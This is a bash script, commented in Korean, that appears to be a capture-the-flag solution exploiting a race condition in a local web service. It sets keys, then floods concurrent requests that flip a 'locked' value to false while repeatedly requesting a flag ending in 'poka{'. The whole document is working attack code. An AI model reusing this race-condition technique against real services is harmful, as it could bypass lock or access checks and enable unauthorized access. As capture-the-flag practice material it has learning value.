#!/bin/bash
# 간단한 bash 스크립트를 이용한 race condition 공격

BASE_URL="http://localhost:23001"
USERNAME="bash_user_$(date +%s)"

echo "Using username: $USERNAME"

# 1. 필요한 값들 설정
echo "Setting up values..."
curl -s "$BASE_URL/set?key=${USERNAME}_apple&value=apple"
curl -s "$BASE_URL/set?key=${USERNAME}_banana&value=$(echo -n 'banana' | base64)"

echo -e "\nStarting race condition attack..."

# 2. Race condition 공격
for i in {1..100}; do
    echo "Attempt $i"
    
    # 백그라운드에서 unlock 요청들 실행
    for j in {1..10}; do
        curl -s "$BASE_URL/set?key=${USERNAME}_locked&value=false" &
    done
    
    # 플래그 요청
    result=$(curl -s "$BASE_URL/flag?username=$USERNAME")
    
    echo "Result: $result"
    
    # 플래그 발견 시 종료
    if [[ $result == *"poka{"* ]]; then
        echo "🎉 SUCCESS: $result"
        break
    fi
    
    # 백그라운드 프로세스 정리
    wait
    
    sleep 0.1
done